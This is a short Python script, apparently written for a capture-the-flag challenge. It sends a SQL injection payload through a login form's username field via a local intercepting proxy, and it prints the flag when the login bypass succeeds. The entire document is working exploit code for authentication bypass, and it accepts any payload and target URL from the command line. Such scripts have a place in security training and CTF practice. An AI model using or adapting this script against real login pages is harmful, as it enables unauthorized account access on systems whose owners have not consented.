import requests
import sys
from bs4 import BeautifulSoup

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    data = {"username": ""+payload, "password": "randomtext"}
    r = requests.post(url, data=data, verify=False, proxies=proxies)
    response = r.text

    if "Login successful" in response:
        soup = BeautifulSoup(r.text,'html.parser')
        flag = soup.findAll('br')[3]
        print("Your flag is:" + flag.nextSibling + ".")
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2]

    except IndexError:
        print('[-] Usage: %s <url> <payload>' % sys.argv[0])
        print('[-] %s www.example.com "1=1"' % sys.argv[0])

    if exploit_sqli(url, payload):
        print("You have logged in.")
    else:
        print("SQL Injection unsuccessful.")
